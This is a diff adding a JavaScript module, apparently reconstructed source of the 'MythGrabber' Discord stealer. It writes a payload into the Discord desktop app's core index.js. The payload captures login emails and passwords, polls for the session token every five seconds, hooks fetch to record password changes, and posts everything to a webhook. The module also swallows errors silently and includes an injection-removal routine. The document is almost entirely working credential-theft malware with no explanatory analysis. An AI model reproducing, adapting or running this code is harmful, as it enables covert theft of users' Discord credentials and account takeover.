@@ -1,0 +1,189 @@
+/**
+ * MythGrabber v140 - Discord Injection Module (Reconstructed)
+ * 
+ * This module injects malicious code into Discord desktop app
+ * to capture credentials and monitor user activity.
+ */
+
+const fs = require('fs-extra');
+const path = require('path');
+const axios = require('axios');
+
+// Discord installation paths
+const DISCORD_PATHS = [
+    path.join(process.env.LOCALAPPDATA, 'Discord'),
+    path.join(process.env.LOCALAPPDATA, 'DiscordCanary'),
+    path.join(process.env.LOCALAPPDATA, 'DiscordPTB')
+];
+
+// Injection payload (obfuscated in actual malware)
+const INJECTION_PAYLOAD = `
+// MythGrabber Discord Injection
+const _0x_webhook = "%WEBHOOK%";
+
+// Hook into Discord's login
+const originalLogin = window.__TAURI__?.login || (() => {});
+
+// Intercept credentials
+document.addEventListener('submit', async (e) => {
+    const form = e.target;
+    const emailInput = form.querySelector('input[name="email"]');
+    const passwordInput = form.querySelector('input[name="password"]');
+    
+    if (emailInput && passwordInput) {
+        const data = {
+            email: emailInput.value,
+            password: passwordInput.value,
+            timestamp: Date.now()
+        };
+        
+        // Send to webhook
+        fetch(_0x_webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: '🔐 Discord Login Captured',
+                    fields: [
+                        { name: 'Email', value: data.email },
+                        { name: 'Password', value: data.password }
+                    ],
+                    color: 0xff0000
+                }]
+            })
+        });
+    }
+});
+
+// Monitor for token changes
+setInterval(() => {
+    const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+    if (token && token !== window._lastToken) {
+        window._lastToken = token;
+        fetch(_0x_webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: '🎫 New Discord Token',
+                    description: token,
+                    color: 0x00ff00
+                }]
+            })
+        });
+    }
+}, 5000);
+
+// Monitor password changes
+const originalFetch = window.fetch;
+window.fetch = async (...args) => {
+    const [url, options] = args;
+    
+    if (url.includes('/users/@me') && options?.method === 'PATCH') {
+        const body = JSON.parse(options.body || '{}');
+        if (body.password || body.new_password) {
+            fetch(_0x_webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: '🔑 Password Change Detected',
+                        fields: [
+                            { name: 'Old Password', value: body.password || 'N/A' },
+                            { name: 'New Password', value: body.new_password || 'N/A' }
+                        ],
+                        color: 0xffff00
+                    }]
+                })
+            });
+        }
+    }
+    
+    return originalFetch.apply(this, args);
+};
+`;
+
+// Find Discord core module
+function findDiscordCore(discordPath) {
+    const appPath = fs.readdirSync(discordPath)
+        .filter(f => f.startsWith('app-'))
+        .sort()
+        .pop();
+    
+    if (!appPath) return null;
+    
+    const corePath = path.join(discordPath, appPath, 'modules', 'discord_desktop_core-1', 'discord_desktop_core');
+    
+    if (fs.existsSync(corePath)) {
+        return path.join(corePath, 'index.js');
+    }
+    
+    // Alternative path
+    const altCorePath = path.join(discordPath, appPath, 'modules', 'discord_desktop_core');
+    if (fs.existsSync(altCorePath)) {
+        return path.join(altCorePath, 'index.js');
+    }
+    
+    return null;
+}
+
+// Inject into Discord
+async function injectDiscord(webhookUrl) {
+    for (const discordPath of DISCORD_PATHS) {
+        if (!fs.existsSync(discordPath)) continue;
+        
+        const corePath = findDiscordCore(discordPath);
+        if (!corePath || !fs.existsSync(corePath)) continue;
+        
+        try {
+            // Read original content
+            let content = fs.readFileSync(corePath, 'utf8');
+            
+            // Check if already injected
+            if (content.includes('MythGrabber')) continue;
+            
+            // Prepare injection
+            const injection = INJECTION_PAYLOAD.replace('%WEBHOOK%', webhookUrl);
+            
+            // Inject at the beginning
+            content = injection + '\n\n' + content;
+            
+            // Write back
+            fs.writeFileSync(corePath, content);
+            
+            console.log(`[+] Injected into ${discordPath}`);
+        } catch (error) {
+            // Silent fail - Discord may be running
+        }
+    }
+}
+
+// Remove injection (cleanup)
+async function removeInjection() {
+    for (const discordPath of DISCORD_PATHS) {
+        if (!fs.existsSync(discordPath)) continue;
+        
+        const corePath = findDiscordCore(discordPath);
+        if (!corePath || !fs.existsSync(corePath)) continue;
+        
+        try {
+            let content = fs.readFileSync(corePath, 'utf8');
+            
+            // Remove injection
+            const injectionStart = content.indexOf('// MythGrabber Discord Injection');
+            if (injectionStart !== -1) {
+                const injectionEnd = content.indexOf('};', injectionStart) + 2;
+                content = content.slice(0, injectionStart) + content.slice(injectionEnd);
+                fs.writeFileSync(corePath, content);
+            }
+        } catch (error) {
+            // Silent fail
+        }
+    }
+}
+
+module.exports = {
+    injectDiscord,
+    removeInjection,
+    DISCORD_PATHS
+};
